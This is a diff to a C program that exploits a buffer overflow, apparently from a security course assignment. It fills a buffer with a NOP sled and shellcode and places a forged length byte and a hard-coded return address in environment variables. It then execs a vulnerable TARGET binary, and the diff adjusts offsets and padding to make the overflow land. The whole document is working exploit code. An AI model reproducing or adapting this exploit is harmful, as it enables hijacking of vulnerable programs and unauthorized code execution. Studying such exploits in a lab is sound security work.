@@ -9,24 +9,23 @@
 int main(void)
 {
   char *args[3];
-  char *env[9];
+  char *env[10];
 
   // memory address between buff and len
   char buffer[400];
   char *nop = "\x90";
 
-  for (int i = 0; i < 112; i++)
+  for (int i = 0; i < 117; i++)
     strcat(buffer, nop);
   strcat(buffer, shellcode);
-  for (int i = 0; i < 5; i++)
-    strcat(buffer, nop);
+
   strcat(buffer, "\0");
 
-  char *newLen = "\xbc"; //188 in decimal
+  char *newLen = "\x14"; //20 in decimal
   char return_addr[] = "\xf6\xfd\x21\x30"; // addr where NOPs in buffer starts
 
   char gap[500];
-  for (int i = 0; i < 3; i++)
+  for (int i = 0; i < 2; i++)
     strcat(gap, nop);
   strcat(gap, return_addr);
 
@@ -35,15 +34,16 @@ int main(void)
   args[1] = buffer;
   args[2] = NULL;
 
-  env[0] = "\0\0";
+  env[0] = "\0"; //sets i=0
   env[1] = "\0";
   env[2] = "\0";
   env[3] = newLen;
   env[4] = "\0\0";
   env[5] = "\0\0";
-  env[6] = gap;
+  env[6] = gap; // 20 characters starting from env[0]
   env[7] = "\0";
-  env[8] = NULL;
+  env[8] = "\0";
+  env[9] = NULL;
 
   if (0 > execve(TARGET, args, env))
     fprintf(stderr, "execve failed.\n");
